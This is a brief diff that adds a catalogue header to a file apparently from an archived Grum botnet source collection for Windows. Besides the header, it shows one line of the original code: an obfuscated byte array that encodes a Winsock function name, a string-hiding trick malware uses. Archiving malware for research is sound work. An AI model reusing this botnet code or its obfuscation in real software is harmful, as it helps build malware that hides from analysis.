@@ -1,1 +1,12 @@
+/*
+  name      Grum
+  type      botnet
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 BYTE g_func_wsastartup[]={0x3,0x6,0x17,0x4,0x2c,0x38,0x28,0x2f,0x29,0x2d,0x5e};
